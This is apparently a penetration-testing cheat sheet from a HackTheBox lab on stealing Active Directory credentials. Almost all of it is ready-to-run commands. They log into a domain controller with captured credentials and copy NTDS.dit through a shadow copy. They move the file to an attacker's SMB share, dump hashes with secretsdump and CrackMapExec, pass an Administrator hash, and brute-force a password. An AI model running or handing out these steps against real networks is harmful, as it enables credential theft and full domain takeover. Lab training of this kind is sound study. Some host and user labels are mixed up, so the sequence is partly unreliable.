#### Connecting to a DC with Evil-WinRM

We can connect to a target DC using the credentials we captured.

  Connecting to a DC with Evil-WinRM

```shell-session
Tachipy@htb[/htb]$ evil-winrm -i 10.129.105.96  -u jmarston -p 'P@ssword!'
```
#### Checking Local Group Membership

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

  Checking Local Group Membership

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```
#### Checking User Account Privileges including Domain

  Checking User Account Privileges including Domain

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
```
#### Creating Shadow Copy of C:

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS

We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

  Copying NTDS.dit from the VSS

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
#### Creating a Share with smbserver.py

```shell-session
Tachipy@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Transferring NTDS.dit to Attack Host

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.221\CompData 
```
#### A Faster Method: Using cme to Capture NTDS.dit

Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

  A Faster Method: Using cme to Capture NTDS.dit

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 10.129.105.96 -u jmarston -p P@ssword! --ntds
```

#### Dump ntds hashes
```cmd
(LHOST)
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
(RHOST)
secretsdump -ntds C:\path\to\NTDS.dit -system C:\path\to\SYSTEM


(RHOST)
secretsdump.py -ntds NTDS.dit -system system.save LOCAL
```


#### Pass-the-Hash with Evil-WinRM Example

  Pass-the-Hash with Evil-WinRM Example

```shell-session
Tachipy@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


#### Brute Force User
```cmd
crackmapexec smb 10.129.113.102 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```

